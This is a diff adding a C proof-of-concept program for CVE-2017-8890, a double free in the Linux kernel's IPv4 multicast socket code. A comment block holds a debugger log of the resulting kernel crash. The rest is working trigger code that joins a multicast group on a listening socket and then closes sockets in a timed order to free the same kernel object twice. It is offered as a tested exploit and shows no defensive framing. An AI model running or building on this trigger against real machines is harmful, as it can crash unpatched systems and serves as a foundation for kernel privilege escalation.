@@ -1,0 +1,242 @@
+/*
+// modify beraphin CVE-2017-8890.cpp
+test on 20180327 @ thinkycx 
+success
+
+gdb-peda$ c
+Continuing.
+[  150.971426] BUG: unable to handle kernel paging request at 000003ff00000505
+[  151.151511] IP: ip_mc_leave_src+0x25/0x90
+[  151.257300] PGD 0 
+[  151.257302] 
+[  151.375055] Oops: 0000 [#1] SMP
+[New Thread 2200]
+[New Thread 2191]
+[New Thread 2187]
+[New Thread 2146]
+[New Thread 2157]
+[New Thread 2160]
+[New Thread 2161]
+[New Thread 2162]
+[New Thread 2199]
+
+Thread 467 received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 2200]
+Warning: not running or target is remote
+0xffffffff8182f4a5 in ip_mc_leave_src (sk=0xffff8800749d2800, iml=0xffff88005d9e4440, 
+    in_dev=0x0 <irq_stack_union>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2155
+2155        err = ip_mc_del_src(in_dev, &iml->multi.imr_multiaddr.s_addr,
+gdb-peda$ bt
+#0  0xffffffff8182f4a5 in ip_mc_leave_src (sk=0xffff8800749d2800, iml=0xffff88005d9e4440, 
+    in_dev=0x0 <irq_stack_union>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2155
+#1  0xffffffff81832f18 in ip_mc_drop_socket (sk=0xffff8800749d2800)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2607
+#2  0xffffffff8182c2c0 in inet_release (sock=0xffff880065b11180)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/af_inet.c:411
+#3  0xffffffff8178b7bf in sock_release (sock=0x0 <irq_stack_union>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/socket.c:599
+#4  0xffffffff8178b832 in sock_close (inode=<optimized out>, filp=<optimized out>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/socket.c:1063
+#5  0xffffffff81246937 in __fput (file=0xffff88005f9f4500)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/fs/file_table.c:209
+#6  0xffffffff81246ade in ____fput (work=<optimized out>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/fs/file_table.c:245
+#7  0xffffffff810a706e in task_work_run ()
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/kernel/task_work.c:116
+#8  0xffffffff810032ba in tracehook_notify_resume (regs=<optimized out>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/include/linux/tracehook.h:191
+#9  exit_to_usermode_loop (regs=0xffffc90003f67f58, cached_flags=0x2)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:160
+#10 0xffffffff81003b29 in prepare_exit_to_usermode (regs=<optimized out>)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:190
+#11 syscall_return_slowpath (regs=0xffffc90003f67f58)
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:259
+#12 0xffffffff818ce948 in entry_SYSCALL_64 ()
+    at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/entry_64.S:239
+#13 0x0000000000000000 in ?? ()
+gdb-peda$ info registers 
+rax            0x0  0x0
+rbx            0x3ff00000501    0x3ff00000501
+rcx            0x1  0x1
+rdx            0x0  0x0
+rsi            0xffff88005d9e4440   0xffff88005d9e4440
+rdi            0x0  0x0
+rbp            0xffffc90003f67de0   0xffffc90003f67de0
+rsp            0xffffc90003f67dc0   0xffffc90003f67dc0
+r8             0x0  0x0
+r9             0x0  0x0
+r10            0xffff880065b111b0   0xffff880065b111b0
+r11            0xffff88005f9f4510   0xffff88005f9f4510
+r12            0xffff88005d9e4440   0xffff88005d9e4440
+r13            0xffff8800749d2938   0xffff8800749d2938
+r14            0xffff8800749d2800   0xffff8800749d2800
+r15            0x0  0x0
+rip            0xffffffff8182f4a5   0xffffffff8182f4a5 <ip_mc_leave_src+37>
+eflags         0x10202  [ IF RF ]
+cs             0x10 0x10
+ss             0x18 0x18
+ds             0x0  0x0
+es             0x0  0x0
+fs             0x0  0x0
+gs             0xb  0xb
+gdb-peda$ x/10i $pc
+=> 0xffffffff8182f4a5 <ip_mc_leave_src+37>: mov    ecx,DWORD PTR [rbx+0x4]
+   0xffffffff8182f4a8 <ip_mc_leave_src+40>: lea    rsi,[rsi+0x8]
+   0xffffffff8182f4ac <ip_mc_leave_src+44>: lea    r8,[rbx+0x18]
+   0xffffffff8182f4b0 <ip_mc_leave_src+48>: xor    r9d,r9d
+   0xffffffff8182f4b3 <ip_mc_leave_src+51>: call   0xffffffff8182f110 <ip_mc_del_src>
+   0xffffffff8182f4b8 <ip_mc_leave_src+56>: mov    QWORD PTR [r12+0x18],0x0
+   0xffffffff8182f4c1 <ip_mc_leave_src+65>: mov    r13d,eax
+   0xffffffff8182f4c4 <ip_mc_leave_src+68>: mov    eax,DWORD PTR [rbx]
+   0xffffffff8182f4c6 <ip_mc_leave_src+70>: lea    eax,[rax*4+0x18]
+   0xffffffff8182f4cd <ip_mc_leave_src+77>: sub    DWORD PTR ds:[r14+0x138],eax
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/select.h>  
+#include <sys/socket.h>  
+#include <arpa/inet.h>  
+#include <netdb.h> 
+#include <string.h> 
+#include <unistd.h> 
+#include <netinet/in.h> 
+#include <fcntl.h> 
+#include <time.h> 
+#include <sys/types.h>
+#include <pthread.h>
+#include <net/if.h>
+#include <errno.h>
+#include <assert.h>
+#define HELLO_WORLD_SERVER_PORT    6666 
+#define LENGTH_OF_LISTEN_QUEUE 1
+#define BUFFER_SIZE 1024
+#define FILE_NAME_MAX_SIZE 512
+bool server_init=false;
+bool server_finish=false;
+bool client_finish=false;
+
+void *server(void *arg)
+{
+    struct sockaddr_in server_addr;
+    bzero(&server_addr,sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htons(INADDR_ANY);
+    server_addr.sin_port = htons(HELLO_WORLD_SERVER_PORT);
+
+    struct	group_req group = {0};
+    struct sockaddr_in *psin;
+
+	psin = (struct sockaddr_in *)&group.gr_group;
+    psin->sin_family = AF_INET;
+    psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));
+
+    int server_socket = socket(PF_INET,SOCK_STREAM,0);
+    if( server_socket < 0)
+    {
+        printf("[Server]Create Socket Failed!\n");
+        exit(1);
+    }
+    // { 
+	   // int opt =1;
+    //    //IPPROTO_IP
+       setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
+    // }
+
+    if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr)))
+    {
+        printf("[Server]Server Bind Port : %d Failed!\n", HELLO_WORLD_SERVER_PORT); 
+        exit(1);
+    }
+
+        
+    if ( listen(server_socket, LENGTH_OF_LISTEN_QUEUE) )
+   {
+       printf("[Server]Server Listen Failed!\n"); 
+       exit(1);
+    }
+
+    struct sockaddr_in client_addr;
+    socklen_t length = sizeof(client_addr);
+ 
+ 	server_init=true;
+    printf ("[Server]accept..... \n"); 
+    int new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
+    if ( new_server_socket < 0)
+    {
+        close(server_socket);
+        printf("[Server]Server Accept Failed!\n");
+        return NULL;
+    }
+        
+    printf("[Server]sleep 1s and close new_server_socket...\n[Attention] first free!...\n");
+    sleep(1);
+    close(new_server_socket);
+    //there must be a period between 2 close()???? 
+    printf("[Server] sleep 5s to wait kfree_rcu...\n");
+    sleep(5);
+    //
+    printf("[Server]sleep 1s and close server_socket..\n[Attention] second free!...\n");
+    sleep(1);
+    close(server_socket);
+
+	server_finish=true;
+    return NULL;
+}
+void *client(void *arg){
+	struct sockaddr_in client_addr;
+	bzero(&client_addr,sizeof(client_addr));
+	client_addr.sin_family=AF_INET;
+	client_addr.sin_addr.s_addr=htons(INADDR_ANY);
+	client_addr.sin_port=htons(0);
+	int client_socket=socket(AF_INET,SOCK_STREAM,0);
+	if(client_socket<0){
+		printf("[Client]Create socket failed!\n");
+		exit(1);
+	}
+	if(bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr))){
+		printf("[Client] client bind port failed!\n");
+		exit(1);
+	}
+	struct sockaddr_in server_addr;
+	bzero(&server_addr,sizeof(server_addr));
+	server_addr.sin_family=AF_INET;
+	if(inet_aton("127.0.0.1",&server_addr.sin_addr)==0){
+        /*
+        int inet_aton(const char *cp, struct in_addr *inp);
+        inet_aton() converts the Internet host address cp from the IPv4 numbers-and-dots notation into \
+            binary form (in network byte order) and stores it in the structure that inp points to. 
+        */
+		printf("[Client]Server IP Address error\n");
+		exit(0);
+	}
+	server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);
+	socklen_t server_addr_length=sizeof(server_addr);
+	if(connect(client_socket,(struct sockaddr*)&server_addr,server_addr_length)<0){
+		printf("[Client]cannot connect to 127.0.0.1!\n");
+		exit(1);
+	}
+	printf("[Client]Close client socket...\n");
+	close(client_socket);
+
+    client_finish=true;
+	return NULL;
+
+}
+int main(int argc,char* argv[])
+{	
+	pthread_t id_server, id_client;
+	pthread_create(&id_server,NULL,server,NULL);
+	while(!server_init){
+        printf("server init success...sleep 1s...\n");
+		sleep(1);
+	}
+	pthread_create(&id_client,NULL,client,NULL);
+	while(!server_finish || !client_finish){
+        printf("waiting server finish & client finish ...sleep 10s...\n");
+		sleep(10);
+	}
+    printf("exit...\n");
+	return 0;
+}
